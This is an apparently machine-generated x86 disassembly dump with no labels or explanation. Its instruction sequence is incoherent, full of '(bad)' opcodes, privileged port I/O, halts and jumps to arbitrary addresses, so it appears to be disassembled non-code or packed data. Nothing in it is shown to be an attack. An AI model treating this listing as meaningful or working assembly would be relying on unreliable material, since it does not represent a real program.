  4225f8:	lods   al,BYTE PTR ds:[esi]
  4225f9:	xchg   edx,eax
  4225fa:	mov    esi,0x8d0eb4eb
  4225ff:	lods   eax,DWORD PTR ds:[esi]
  422600:	push   edx
  422601:	or     eax,0x31216450
  422606:	ins    BYTE PTR es:[edi],dx
  422607:	test   eax,0x9150ad89
  42260c:	mov    ebp,0x21e900ea
  422611:	pop    esp
  422612:	(bad)  
  422613:	in     al,dx
  422614:	and    BYTE PTR [ebx],al
  422616:	inc    eax
  422617:	mov    ecx,0x24512d
  42261c:	add    BYTE PTR [eax],al
  42261e:	add    BYTE PTR [eax],al
  422620:	ins    DWORD PTR es:[edi],dx
  422621:	xor    ebp,DWORD PTR [ebp+0xf09570f]
  422627:	add    BYTE PTR [ecx-0x49f91ac9],bh
  42262d:	ss call 0xb66:0x114b9002
  422635:	aas    
  422636:	int    0x67
  422638:	div    BYTE PTR [edx+0x4d102396]
  42263e:	adc    DWORD PTR [eax],eax
  422640:	(bad)  
  422641:	into   
  422642:	test   DWORD PTR [ecx],eax
  422644:	nop
  422645:	dec    ecx
  422646:	mov    ebx,0xcc2fc801
  42264b:	(bad)  
  42264c:	fisttp QWORD PTR [esi-0x64]
  42264f:	xor    DWORD PTR [ebp+ecx*8-0x7b6fffec],0xffffffad
  422657:	and    edi,DWORD PTR [esp+eax*8-0x6f749a14]
  42265e:	jle    0x42267b
  422660:	stos   BYTE PTR es:[edi],al
  422661:	jns    0x42260c
  422663:	dec    edi
  422664:	add    eax,0x1d73cd46
  422669:	out    0xee,al
  42266b:	mov    edx,DWORD PTR [ebx-0x3617eeb7]
  422671:	aam    0x12
  422673:	add    BYTE PTR ds:0x5683170a,cl
  422679:	dec    ebx
  42267a:	adc    DWORD PTR [eax],eax
  42267c:	adc    BYTE PTR [edi-0x3170ffec],bl
  422682:	mov    BYTE PTR [ecx],0x0
  422685:	add    BYTE PTR [eax],al
  422687:	add    BYTE PTR [eax],al
  422689:	nop
  42268a:	dec    ecx
  42268b:	ret    0x76d1
  42268e:	push   edx
  42268f:	mov    esp,0xc2d696ff
  422694:	add    DWORD PTR [eax-0x53ac37b7],edx
  42269a:	jno    0x422638
  42269c:	xor    eax,0x1fcd5dcf
  4226a1:	adc    eax,0x606bee96
  4226a6:	(bad)  
  4226a7:	mov    fs,WORD PTR [ebx]
  4226a9:	mov    BYTE PTR [ebx+0x11],cl
  4226ac:	add    BYTE PTR [eax-0x4e],al
  4226af:	aas    
  4226b0:	jnp    0x4226cb
  4226b2:	mov    bl,0xf7
  4226b4:	mov    eax,ds:0x41b1e66
  4226b9:	xchg   edx,eax
  4226ba:	mov    dl,0xf7
  4226bc:	mov    ds,WORD PTR [ebp-0x601fb4d7]
  4226c2:	mov    ah,0xf7
  4226c4:	add    edx,DWORD PTR [edi]
  4226c6:	inc    esi
  4226c7:	sbb    eax,DWORD PTR [eax]
  4226c9:	xchg   edx,eax
  4226ca:	mov    dl,0xf7
  4226cc:	mov    ebx,ss
  4226ce:	xchg   esi,eax
  4226cf:	xlat   BYTE PTR ds:[ebx]
  4226d0:	mov    dl,bl
  4226d2:	xchg   esi,eax
  4226d3:	mov    edi,0xf7b2dfab
  4226d8:	add    eax,edx
  4226da:	sub    eax,0x2bfdfb3
  4226df:	adc    eax,0xb7c8e7ef
  4226e4:	add    ecx,DWORD PTR [ebp+0x1104ba28]
  4226ea:	jbe    0x4226b7
  4226ec:	retf   
  4226ed:	add    BYTE PTR [eax],al
  4226ef:	add    BYTE PTR [eax],al
  4226f1:	add    BYTE PTR [esi+esi*1-0x4d6ffc0c],bl
  4226f8:	inc    ecx
  4226f9:	push   es
  4226fa:	(bad)  
  4226fb:	mov    esi,DWORD PTR [esi-0x3315a071]
  422701:	jle    0x4226d7
  422703:	mov    al,0xf7
  422705:	add    edx,DWORD PTR [ecx]
  422707:	ficom  WORD PTR [ebx]
  422709:	shl    BYTE PTR [ebp-0x9a88a51],0x5e
  422710:	imul   DWORD PTR [ebp-0x78d80561]
  422716:	push   edx
  422717:	mov    dh,0x27
  422719:	xchg   DWORD PTR [ebx-0x6a],edx
  42271c:	push   DWORD PTR [ebx-0x182c0a34]
  422722:	stos   DWORD PTR es:[edi],eax
  422723:	mov    dl,0xf7
  422725:	add    ebp,DWORD PTR [esi]
  422727:	sub    ebx,ebp
  422729:	fild   WORD PTR [ebx+0x4a]
  42272c:	push   cs
  42272d:	retf   
  42272e:	add    eax,0xa003ed5f
  422733:	push   edi
  422734:	cld    
  422735:	jmp    0xa4dad9cd
  42273a:	lahf   
  42273b:	xor    cl,dh
  42273d:	out    0x17,al
  42273f:	sub    cl,BYTE PTR [edi]
  422741:	jmp    0x19e6d6d9
  422746:	push   cs
  422747:	hlt    
  422748:	adc    eax,0x52925000
  42274d:	out    0x9,al
  42274f:	fisttp DWORD PTR [edi]
  422751:	jmp    0xacde27e9
  422756:	add    BYTE PTR [eax],al
  422758:	add    BYTE PTR [eax],al
  42275a:	add    BYTE PTR [esi-0x12],ah
  42275d:	fwait
  42275e:	gs aas 
  422760:	ss adc cl,ch
  422763:	xchg   ebx,eax
  422764:	add    dh,bh
  422766:	call   FWORD PTR [ecx]
  422768:	pop    esi
  422769:	in     eax,dx
  42276a:	mov    edx,0xc55228da
  42276f:	addr16 out dx,al
  422771:	aas    
  422772:	popa   
  422773:	cmpps  xmm2,XMMWORD PTR [esi+0x3fb293eb],0x74
  42277b:	adc    BYTE PTR [edx-0x4d6c1466],dl
  422781:	xchg   ecx,eax
  422782:	stos   DWORD PTR es:[edi],eax
  422783:	xchg   ecx,eax
  422784:	add    bl,BYTE PTR [eax-0x68760fcb]
  42278a:	xor    eax,0xd4ede9f0
  42278f:	push   edi
  422790:	ror    BYTE PTR [esi-0x17],0x10
  422794:	push   ds
  422795:	sbb    eax,0xed5ccc64
  42279a:	jmp    0x2ddb95b8
  42279f:	lock cdq 
  4227a1:	xchg   ebx,eax
  4227a2:	mov    al,ds:0x571dc300
  4227a7:	push   edx
  4227a8:	sub    dl,BYTE PTR [edx+0x0]
  4227ab:	xor    eax,0xb541241e
  4227b0:	sub    eax,0x5a708afe
  4227b5:	nop
  4227b6:	leave  
  4227b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227b8:	lods   eax,DWORD PTR ds:[esi]
  4227b9:	jmp    0x42277d
  4227bb:	cmp    DWORD PTR [eax+0x720f],edi
  4227c1:	add    BYTE PTR [eax],al
  4227c3:	add    BYTE PTR [edi-0x71],bl
  4227c6:	sbb    al,BYTE PTR [ecx]
  4227c8:	test   eax,0x894197b1
  4227cd:	and    DWORD PTR [esp+eax*2+0x71ea5295],edx
  4227d4:	jno    0x422800
  4227d6:	push   ecx
  4227d7:	and    al,0x39
  4227d9:	and    ebp,esi
  4227db:	jg     0x4227cd
  4227dd:	mov    dh,0xe
  4227df:	data16 jo 0x422827
  4227e2:	xor    DWORD PTR [eax+0x4],ebp
  4227e5:	stos   BYTE PTR es:[edi],al
  4227e6:	pop    ds
  4227e7:	shl    al,0x32
  4227ea:	xor    DWORD PTR [eax-0x76f14ec7],eax
  4227f0:	cmc    
  4227f1:	jl     0x42286c
  4227f3:	inc    ebp
  4227f5:	jge    0x422820
  4227f7:	call   DWORD PTR [ecx+ecx*4+0x0]
  4227fb:	inc    eax
  4227fc:	cmp    DWORD PTR [eax],ebp
  4227fe:	pop    ecx
  4227ff:	and    al,0x8d
  422801:	mov    DWORD PTR [edx],edi
  422803:	cmp    DWORD PTR [ebp+0x2e0a5152],0x37
  42280a:	(bad)  
  42280b:	add    cl,bh
  42280d:	mov    al,0x78
  42280f:	adc    BYTE PTR [ecx-0x4a76f0f8],dh
  422815:	push   edx
  422816:	xor    DWORD PTR [eax+0x53],ebx
  422819:	mov    dl,0x74
  42281b:	mov    DWORD PTR [ebp-0x56a786ae],esi
  422821:	sub    edx,DWORD PTR [eax+0x4]
  422824:	cdq    
  422825:	sub    edx,DWORD PTR [ecx+0x24]
  422828:	add    BYTE PTR [eax],al
  42282a:	add    BYTE PTR [eax],al
  42282c:	add    BYTE PTR [eax+0x7fe7a2bf],dl
  422832:	rcl    BYTE PTR [ecx],cl
  422834:	add    BYTE PTR [edx],bh
  422836:	arpl   WORD PTR [edx-0x5a8f49b],bp
  42283c:	imul   edx,DWORD PTR [edx+0x74439bad],0xd800a95d
  422846:	mov    DWORD PTR [ebp-0x65038bdd],0x7e676c4b
  422850:	pop    ebp
  422851:	ret    
  422852:	mov    DWORD PTR [ecx+0x1149907f],edi
  422858:	push   eax
  422859:	or     eax,0x9287cdd6
  42285e:	dec    ecx
  42285f:	adc    DWORD PTR [eax+0x6f],edx
  422862:	xchg   DWORD PTR [ecx-0x74b62feb],esi
  422868:	mov    ah,dl
  42286a:	jne    0x422809
  42286c:	gs or  esi,ecx
  42286f:	int    0x8b
  422871:	xchg   edx,eax
  422872:	dec    ecx
  422873:	adc    DWORD PTR ds:0xc39089ff,ecx
  422879:	mov    esi,cs
  42287b:	xchg   ebp,eax
  42287c:	and    edx,DWORD PTR [eax]
  42287e:	dec    eax
  42287f:	adc    DWORD PTR [eax],eax
  422881:	sbb    DWORD PTR [esi],edx
  422883:	int    0x33
  422885:	cmp    BYTE PTR [ecx+0x5d],dh
  422888:	cld    
  422889:	pop    ds
  42288a:	jecxz  0x42285a
  42288c:	and    ebp,DWORD PTR [eax+ecx*8+0xa]
  422890:	cld    
  422891:	add    BYTE PTR [eax],al
  422893:	add    BYTE PTR [eax],al
  422895:	add    BYTE PTR [edi+0x7feb6d5],bl
  42289b:	dec    edx
  42289c:	enter  0xb47b,0x65
  4228a0:	mov    bh,0x3
  4228a2:	pop    eax
  4228a3:	out    dx,eax
  4228a4:	loop   0x4228fc
  4228a6:	lahf   
  4228a7:	xchg   ebp,eax
  4228a8:	push   ecx
  4228a9:	mov    BYTE PTR [edx+esi*4-0x25],dl
  4228ad:	not    DWORD PTR [eax]
  4228af:	jae    0x4228a6
  4228b1:	mov    dl,BYTE PTR [ebx-0x6a]
  4228b4:	aaa    
  4228b5:	mov    DWORD PTR [ebx-0x6a],esp
  4228b8:	xor    ebx,ecx
  4228ba:	(bad)  
  4228bb:	fdivr  QWORD PTR [edi-0x2c08fafc]
  4228c1:	stos   DWORD PTR es:[edi],eax
  4228c2:	jle    0x4228ba
  4228c4:	fcmovne st,st(7)
  4228c6:	and    bh,BYTE PTR [ebp-0x6d8c6f84]
  4228cc:	(bad)  
  4228cd:	shl    BYTE PTR [ebx-0x32],0xa7
  4228d1:	rcl    bh,1
  4228d3:	add    dl,BYTE PTR [ecx]
  4228d5:	xor    esp,ecx
  4228d7:	sub    eax,0x5bd7eaf3
  4228dc:	stos   DWORD PTR es:[edi],eax
  4228dd:	ffreep st(7)
  4228df:	pop    ebx
  4228e0:	ret    0x9dd7
  4228e3:	repnz test DWORD PTR [eax-0x7eec692d],0x7fe45b5f
  4228ee:	dec    ecx
  4228ef:	mov    dl,0xf7
  4228f1:	add    ecx,DWORD PTR [ebx]
  4228f3:	inc    esi
  4228f4:	fistp  DWORD PTR [ebx]
  4228f6:	dec    edi
  4228f7:	pop    ebx
  4228f8:	test   DWORD PTR [eax+0x0],0xaf4a4f00
  422902:	push   edx
  422903:	cmp    al,0x5b
  422905:	jae    0x42294b
  422907:	test   BYTE PTR [esi],dh
  422909:	sub    eax,DWORD PTR [eax+edx*4]
  42290c:	mov    dl,0x70
  42290e:	enter  0xf273,0x62
  422912:	mov    edi,0x87279273
  422917:	rcl    DWORD PTR [esi+0x72c0b453],cl
  42291d:	daa    
  42291e:	pop    esp
  42291f:	add    al,0x5b
  422921:	test   DWORD PTR [ebx],0x870771a9
  422927:	xchg   ebx,eax
  422928:	mov    DWORD PTR [esi],ecx
  42292a:	sbb    DWORD PTR [ebp+0x7cf132df],eax
  422930:	rcl    BYTE PTR [edx-0x1],0xd3
  422934:	pop    edx
  422935:	cwde   
  422936:	mov    ecx,0xe26d8156
  42293b:	xchg   esp,eax
  42293c:	and    eax,0xa3fbc55a
  422941:	pop    edx
  422942:	int    0xcf
  422944:	fild   QWORD PTR [edx-0x46]
  422947:	push   ebx
  422948:	aad    0x97
  42294a:	sub    al,0x94
  42294c:	sub    dl,BYTE PTR [ebx-0x15]
  42294f:	rcl    esp,cl
  422951:	daa    
  422952:	in     eax,0xbf
  422954:	sar    BYTE PTR [eax-0x1b],cl
  422957:	fisubr DWORD PTR [ebp-0xae4d7ae]
  42295d:	adc    DWORD PTR [edx+0x47],esp
  422960:	xchg   esi,eax
  422961:	and    al,BYTE PTR [edx]
  422963:	add    BYTE PTR [eax],al
  422965:	add    BYTE PTR [eax],al
  422967:	add    BYTE PTR [ebp-0x7c2ce71c],bh
  42296d:	add    bh,BYTE PTR [edi]
  42296f:	fs das 
  422971:	xchg   esi,eax
  422972:	bound  eax,QWORD PTR [edx-0x74]
  422975:	int3   
  422976:	adc    al,al
  422978:	cmp    BYTE PTR [ecx],bl
  42297a:	arpl   WORD PTR [edx-0x46b949d7],si
  422980:	push   ss
  422981:	div    BYTE PTR [edx]
  422983:	cdq    
  422984:	add    ebp,DWORD PTR ds:0x5203ed53
  42298a:	cmc    
  42298b:	xchg   bx,ax
  42298d:	mov    dl,0x78
  42298f:	jmp    0x42297c
  422991:	jmp    0xc889cf31
  422996:	ds jb  0x4229e1
  422999:	xchg   esi,eax
  42299a:	push   esi
  42299b:	push   0xffffffcc
  42299d:	push   edi
  42299e:	adc    DWORD PTR [esp+eax*2-0x739922ae],ebp
  4229a5:	mov    dl,0x9b
  4229a7:	add    BYTE PTR [ebp+0x4a],ch
  4229aa:	in     eax,dx
  4229ab:	add    ecx,ebp
  4229ad:	mov    ch,0xeb
  4229af:	je     0x42294e
  4229b1:	jbe    0x422a10
  4229b3:	xor    edi,DWORD PTR [ecx]
  4229b5:	pop    ds
  4229b6:	xchg   esi,eax
  4229b7:	inc    esp
  4229b8:	int    0x19
  4229ba:	push   cs
  4229bb:	ret    0x1b99
  4229be:	jmp    0xd515:0xea71dd74
  4229c5:	pop    ebx
  4229c6:	sub    eax,0x31724200
  4229cb:	and    al,0x0
  4229cd:	add    BYTE PTR [eax],al
  4229cf:	add    BYTE PTR [eax],al
  4229d1:	cli    
  4229d2:	cmc    
  4229d3:	mov    ?,ecx
  4229d5:	es mov ch,0x81
  4229d8:	rcl    BYTE PTR [ebx+0x258948b0],0x4a
  4229df:	adc    DWORD PTR [ecx],eax
  4229e1:	test   eax,0x48c91fb5
  4229e6:	push   ds
  4229e7:	push   cs
  4229e8:	ret    0x2af0
  4229eb:	xor    DWORD PTR [eax],eax
  4229ed:	push   0x2d8b0eb5
  4229f2:	push   ecx
  4229f3:	and    eax,0x154afd89
  4229f8:	add    DWORD PTR [ecx-0x4b],edi
  4229fb:	pop    ebp
  4229fc:	(bad)  
  4229fd:	in     eax,dx
  4229fe:	dec    edx
  4229ff:	adc    DWORD PTR [ecx],eax
  422a01:	imul   esi,DWORD PTR [ebp-0x54faec2],0xb5381031
  422a0b:	push   cs
  422a0c:	call   FWORD PTR [ebp+eiz*4+0x0]
  422a10:	inc    eax
  422a11:	sub    DWORD PTR [edx],ebp
  422a13:	lods   eax,DWORD PTR ds:[esi]
  422a14:	movzx  ebx,BYTE PTR [edx-0x27c9001a]
  422a1b:	imul   esp,DWORD PTR [ecx+esi*2],0x8d2459d9
  422a22:	mov    dh,0x26
  422a24:	mov    ah,0x90
  422a26:	add    BYTE PTR [eax],0xe8
  422a29:	mov    eax,ds:0x85fc19cc
  422a2e:	arpl   WORD PTR [esi+edi*8+0xf],ax
  422a32:	mov    bh,0xf6
  422a34:	pop    ss
  422a35:	add    BYTE PTR [eax],al
  422a37:	add    BYTE PTR [eax],al
  422a39:	add    bl,bh
  422a3b:	inc    esi
  422a3c:	les    edi,FWORD PTR [edi-0x3593dce6]
  422a42:	call   0xd841c156
  422a47:	jecxz  0x4229f6
  422a49:	and    eax,DWORD PTR [eax-0x380125ce]
  422a4f:	dec    edx
  422a50:	inc    esp
  422a51:	(bad)  
  422a52:	test   al,0xdc
  422a54:	adc    DWORD PTR [eax],eax
  422a56:	nop
  422a57:	sbb    al,0x51
  422a59:	imul   eax,DWORD PTR [edi-0x6dbb9457],0x9736b8c3
  422a63:	jbe    0x422a4c
  422a65:	imul   eax,DWORD PTR [eax+0x5030a173],0x98448e1a
  422a6f:	sbb    DWORD PTR [eax],eax
  422a71:	adc    dh,al
  422a73:	ja     0x422a46
  422a75:	call   DWORD PTR [edx]
  422a77:	mov    gs,ebp
  422a79:	call   0x86938713
  422a7e:	iret   
  422a7f:	dec    ebp
  422a80:	ins    BYTE PTR es:[edi],dx
  422a81:	int3   
  422a82:	push   0x57fc429c
  422a87:	jecxz  0x422a5e
  422a89:	and    ebp,DWORD PTR [esp+ecx*8-0x326803e7]
  422a90:	inc    esp
  422a91:	(bad)  
  422a92:	aas    
  422a93:	dec    edx
  422a94:	add    BYTE PTR [ebx+0x6c],dh
  422a97:	gs (bad) 
  422a99:	mov    cl,0xd4
  422a9c:	and    DWORD PTR [eax+0x0],ecx
  422aa2:	add    BYTE PTR [esi-0x4e],dl
  422aa5:	out    dx,al
  422aa6:	cmc    
  422aa7:	pop    ds
  422aa8:	mov    bl,0xf4
  422aaa:	jge    0x422adb
  422aac:	xor    al,0xca
  422aae:	add    eax,DWORD PTR [ebx+0x537f26e1]
  422ab4:	mov    gs,ebx
  422ab6:	mov    bl,0x10
  422ab8:	inc    edi
  422ab9:	jecxz  0x422b39
  422abb:	dec    ebx
  422abc:	mov    fs,edi
  422abe:	sbb    ebp,DWORD PTR [ebx+eiz*1-0x5c]
  422ac2:	adc    DWORD PTR [eax],ebx
  422ac4:	out    0x13,eax
  422ac6:	lock or BYTE PTR [ebx+0x7f],cl
  422aca:	and    BYTE PTR fs:[eax-0x74],bl
  422ace:	test   edx,ecx
  422ad0:	push   edi
  422ad1:	or     al,BYTE PTR [ecx]
  422ad3:	sbb    edi,ebx
  422ad5:	rcr    ebx,cl
  422ad7:	add    BYTE PTR [edx-0x458c4fa1],dh
  422add:	jle    0x422b35
  422adf:	scas   eax,DWORD PTR es:[edi]
  422ae0:	push   edi
  422ae1:	idiv   DWORD PTR [edx+ebx*8+0x4a]
  422ae5:	into   
  422ae6:	dec    edi
  422ae7:	lahf   
  422ae8:	push   edi
  422ae9:	pusha  
  422aea:	enter  0x8673,0x60
  422aee:	cwde   
  422aef:	mov    bl,0x8a
  422af1:	rol    DWORD PTR ds:0xb436abdf,1
  422af7:	shl    BYTE PTR [edx-0x79],0x7c
  422afb:	bound  ebp,QWORD PTR [ebx]
  422afd:	cmp    eax,0x245d431c
  422b02:	adc    DWORD PTR [esi],ecx
  422b04:	out    dx,al
  422b05:	adc    esi,DWORD PTR [eax+eax*1+0x0]
  422b0c:	adc    BYTE PTR [edx-0xa],bl
  422b0f:	xchg   esi,eax
  422b10:	mov    gs,WORD PTR [ebx]
  422b12:	and    bh,BYTE PTR [ebp+0x5d]
  422b15:	dec    edx
  422b16:	dec    edi
  422b17:	push   ebx
  422b18:	inc    esp
  422b19:	push   edi
  422b1a:	jo     0x422b5b
  422b1c:	aaa    
  422b1d:	add    al,0x29
  422b1f:	adc    DWORD PTR [ebx+ebp*1],esi
  422b22:	fwait
  422b23:	out    0xdf,eax
  422b25:	dec    ebx
  422b26:	push   cs
  422b27:	loopne 0x422acd
  422b29:	jmp    0x422b5d
  422b2b:	int    0x7b
  422b2d:	repnz mov eax,ds:0xeb3280e6
  422b33:	ficom  WORD PTR [eax-0x5f29cfd2]
  422b39:	push   esi
  422b3a:	xchg   ecx,eax
  422b3b:	int3   
  422b3c:	xchg   edx,eax
  422b3d:	fimul  WORD PTR [ecx-0x6]
  422b40:	push   ebx
  422b41:	sub    esi,esp
  422b43:	shl    BYTE PTR [esi],cl
  422b45:	sub    bl,ch
  422b47:	shl    ecx,0x6
  422b4a:	in     eax,dx
  422b4b:	scas   al,BYTE PTR es:[edi]
  422b4c:	pop    esp
  422b4d:	dec    edi
  422b4e:	xchg   ecx,eax
  422b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b50:	and    ah,0x16
  422b53:	pop    edx
  422b54:	xchg   esi,eax
  422b55:	sub    cl,BYTE PTR [edx-0x33]
  422b58:	mov    ebx,0x7e622d49
  422b5d:	dec    edi
  422b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b5f:	inc    edx
  422b60:	xchg   ebx,eax
  422b61:	mov    dl,0x21
  422b63:	test   eax,0xc532e380
  422b68:	and    al,0x84
  422b6a:	bound  edx,QWORD PTR ds:[ecx+0x4f]
  422b6e:	jns    0x422bcc
  422b70:	add    BYTE PTR [eax],al
  422b72:	add    BYTE PTR [eax],al
  422b74:	add    BYTE PTR [eax-0x6d9e6eaa],al
  422b7a:	loope  0x422b95
  422b7c:	bound  edi,QWORD PTR [esi+0x5441dc2a]
  422b82:	add    eax,0xa49446ed
  422b87:	xchg   ecx,eax
  422b88:	inc    ecx
  422b89:	and    al,0x16
  422b8c:	jp     0x422b20
  422b8e:	sub    cl,BYTE PTR [edx+0x5]
  422b91:	ins    BYTE PTR es:[edi],dx
  422b92:	dec    ebx
  422b93:	adc    bl,dl
  422b95:	shr    DWORD PTR [ebx],cl
  422b97:	out    0x72,al
  422b99:	mov    cs,WORD PTR [ebp-0x38]
  422b9c:	pop    ebx
  422b9d:	mov    al,ds:0x9b1e9956
  422ba2:	add    al,0x93
  422ba4:	add    BYTE PTR [ecx],ch
  422ba6:	mov    dl,0x8e
  422ba8:	(bad)  
  422ba9:	cmp    BYTE PTR ds:0x3d828406,bh
  422baf:	add    bh,bh
  422bb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bb2:	dec    ebp
  422bb3:	cmp    DWORD PTR [ebx+0x74eaa5e3],eax
  422bb9:	xchg   ebp,eax
  422bba:	bound  edx,QWORD PTR [esi-0x1fb02e32]
  422bc0:	dec    esi
  422bc2:	sub    ebp,DWORD PTR [ebp-0x6812abf1]
  422bc8:	mov    eax,0x1effe5a7
  422bce:	sbb    al,0x96
  422bd0:	in     al,dx
  422bd1:	push   0xffffff92
  422bd3:	or     DWORD PTR [esi+0x62],edx
  422bd6:	mov    edi,0xfa8e
  422bdb:	add    BYTE PTR [eax],al
  422bdd:	add    BYTE PTR [esi],ch
  422bdf:	cmp    ecx,DWORD PTR [edi-0xa]
  422be2:	je     0x422b96
  422be4:	adc    bh,al
  422be6:	je     0x422baa
  422be8:	sbb    eax,0x62b1a900
  422bed:	sbb    BYTE PTR [ebx+esi*2],bh
  422bf0:	jmp    0xf1b55846
  422bf5:	push   ecx
  422bf6:	jnp    0x422b9d
  422bf8:	add    BYTE PTR [eax],bh
  422bfa:	xchg   edi,eax
  422bfb:	jno    0x422bea
  422bfd:	test   BYTE PTR [ecx-0x4e7cfcc6],bh
  422c03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422c04:	test   BYTE PTR [eax-0x24],0x6b
  422c08:	jmp    0xf1ae285d
  422c0d:	push   eax
  422c0e:	or     esp,DWORD PTR [eax+eax*1-0x128eb8c0]
  422c15:	jmp    0x6be0:0xe850d9d7
  422c1c:	in     eax,0x66
  422c1e:	ret    0xf36b
  422c21:	jmp    0x422bb3
  422c23:	inc    ebp
  422c24:	nop
  422c25:	bound  edi,QWORD PTR [eax]
  422c27:	dec    ebx
  422c28:	sar    BYTE PTR [edi-0xa281d52],0x1a
  422c2f:	push   cs
  422c30:	jmp    0xd815bc9e
  422c35:	repnz stos BYTE PTR es:[edi],al
  422c37:	push   ebx
  422c38:	mov    es,WORD PTR [edx+0x1c]
  422c3b:	fwait
  422c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c3d:	lds    edx,FWORD PTR [ebp+0x7f]
  422c40:	adc    ebp,edi
  422c42:	add    BYTE PTR [eax],al
  422c44:	add    BYTE PTR [eax],al
  422c46:	add    BYTE PTR [ebp-0x6fc01b59],bl
  422c4c:	enter  0x709,0xff
  422c50:	adc    bh,al
  422c52:	mov    edi,0xc12bb550
  422c57:	cwde   
  422c58:	dec    ebx
  422c59:	xchg   edx,eax
  422c5a:	jmp    0x422c00
  422c5c:	dec    edx
  422c5d:	adc    DWORD PTR [eax],eax
  422c5f:	inc    ebx
  422c60:	xchg   esi,eax
  422c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c62:	mov    cl,al
  422c64:	fwait
  422c65:	imul   esi,DWORD PTR [ebx+0x6c],0x67
  422c69:	or     eax,esi
  422c6b:	add    ecx,DWORD PTR [ebx+0x11]
  422c6e:	xor    ecx,ecx
  422c70:	outs   dx,BYTE PTR ds:[esi]
  422c71:	prefetch BYTE PTR [edx+ecx*1]
  422c75:	xchg   edi,edi
  422c77:	cmp    DWORD PTR [esi+ecx*4+0x53],eax
  422c7b:	je     0x422c98
  422c7d:	push   0x4b
  422c7f:	ins    BYTE PTR es:[edi],dx
  422c80:	ret    
  422c81:	imul   ecx,ebp,0xfc4ca878
  422c87:	xchg   esi,eax
  422c89:	push   ecx
  422c8a:	jae    0x422c2a
  422c8c:	mov    eax,0x456b4039
  422c91:	xchg   ecx,eax
  422c92:	jnp    0x422c48
  422c94:	jl     0x422ca7
  422c96:	je     0x422c1f
  422c98:	outs   dx,DWORD PTR ds:[esi]
  422c99:	adc    DWORD PTR [ecx+0xd],edx
  422c9c:	ds cmc 
  422c9e:	sbb    al,0xb
  422ca0:	mov    bl,0x25
  422ca2:	sbb    edx,DWORD PTR [ebx+0x130e0c04]
  422ca8:	jae    0x422c34
  422caa:	add    BYTE PTR es:[eax],al
  422cad:	add    BYTE PTR [eax],al
  422caf:	add    BYTE PTR [ecx-0x2552438e],al
  422cb5:	div    DWORD PTR [esi+0x47]
  422cb8:	arpl   WORD PTR [ecx+0x285103f7],si
  422cbe:	mov    bl,0xe7
  422cc0:	push   0xd37b8122
  422cc5:	mov    cs,WORD PTR [edi]
  422cc7:	jns    0x422ca7
  422cc9:	daa    
  422cca:	mov    dh,0x43
  422ccc:	out    dx,eax
  422ccd:	ret    0x2276
  422cd0:	call   DWORD PTR [ebx-0x24]
  422cd3:	add    al,0x89
  422cd5:	and    BYTE PTR [eax+0x43],0xb2
  422cd9:	mov    dl,0xac
  422cdb:	add    al,0x90
  422cdd:	jno    0x422cb5
  422cdf:	hlt    
  422ce0:	mov    BYTE PTR [ecx-0x4a],dh
  422ce3:	and    al,0x8f
  422ce5:	jno    0x422c68
  422ce7:	cld    
  422ce8:	cwde   
  422ce9:	jo     0x422d0a
  422ceb:	call   0x53bf:0xdc2f591
  422cf2:	idiv   esp
  422cf4:	or     al,0x2a
  422cf6:	test   DWORD PTR [ebx],0x9a6c9f90
  422cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cfd:	add    BYTE PTR [ebx-0x48],dh
  422d00:	jae    0x422cb5
  422d02:	jo     0x422d42
  422d04:	scas   eax,DWORD PTR es:[edi]
  422d05:	or     eax,DWORD PTR [edx+0x372e8c0d]
  422d0b:	cwde   
  422d0c:	xor    BYTE PTR [eax],ch
  422d0e:	mov    ebx,0xb32aa4e7
  422d13:	iret   
  422d14:	add    BYTE PTR [eax],al
  422d16:	add    BYTE PTR [eax],al
  422d18:	add    BYTE PTR [edi-0x6767c8d2],dh
  422d1e:	jmp    0x422d96
  422d20:	or     eax,0xe90eb264
  422d25:	xchg   ebx,eax
  422d26:	aam    0xc7
  422d28:	inc    edx
  422d29:	adc    BYTE PTR [edx-0x70a78b29],ah
  422d2f:	or     bh,BYTE PTR [ecx-0x52641bfe]
  422d35:	aaa    
  422d36:	out    0x3e,eax
  422d38:	pusha  
  422d39:	push   eax
  422d3a:	(bad)  
  422d3b:	cmp    al,BYTE PTR [esi]
  422d3d:	daa    
  422d3e:	add    ebp,DWORD PTR [bx+di+0x2f93]
  422d43:	into   
  422d44:	jge    0x422d61
  422d46:	add    ecx,DWORD PTR [ecx+0x61]
  422d49:	dec    eax
  422d4a:	pop    DWORD PTR [esi]
  422d4c:	rcr    ch,cl
  422d4e:	sub    DWORD PTR [edx+0x5],edx
  422d51:	add    BYTE PTR [edx],ch
  422d53:	out    0x6c,al
  422d55:	push   ebx
  422d56:	fbstp  TBYTE PTR [ebx]
  422d58:	adc    BYTE PTR ds:0x68f062af,dl
  422d5e:	(bad)  
  422d5f:	or     ah,BYTE PTR [esp+edx*4-0x20]
  422d63:	loop   0x422d27
  422d65:	in     al,0x29
  422d67:	push   ebp
  422d68:	sar    ecx,1
  422d6a:	scas   al,BYTE PTR es:[edi]
  422d6b:	xchg   ecx,eax
  422d6c:	test   eax,0x259c0297
  422d71:	mov    eax,0xe2813ea1
  422d76:	cs push cs
  422d78:	jmp    0xe5751cb5
  422d7d:	add    BYTE PTR [eax],al
  422d7f:	add    BYTE PTR [eax],al
  422d81:	add    bl,ah
  422d83:	push   ebp
  422d84:	add    edx,DWORD PTR [ecx+0x6c0e929e]
  422d8a:	mov    edi,ds
  422d8c:	lods   al,BYTE PTR ds:[esi]
  422d8d:	arpl   di,cx
  422d8f:	mov    es,WORD PTR [esi]
  422d91:	and    eax,0xa893bf3a
  422d96:	xchg   edx,eax
  422d97:	mov    dl,0xe
  422d99:	ret    
  422d9a:	cmp    DWORD PTR ds:0xdc580552,0xe
  422da1:	add    BYTE PTR [ecx],cl
  422da3:	mov    edi,0x763f6000
  422da8:	in     eax,dx
  422da9:	push   cs
  422daa:	fistp  QWORD PTR [ecx+0x31]
  422dad:	xor    al,0xea
  422daf:	stc    
  422db0:	sbb    DWORD PTR [esi-0x40],esp
  422db3:	xor    DWORD PTR [ecx],esi
  422db5:	xor    BYTE PTR [ecx],al
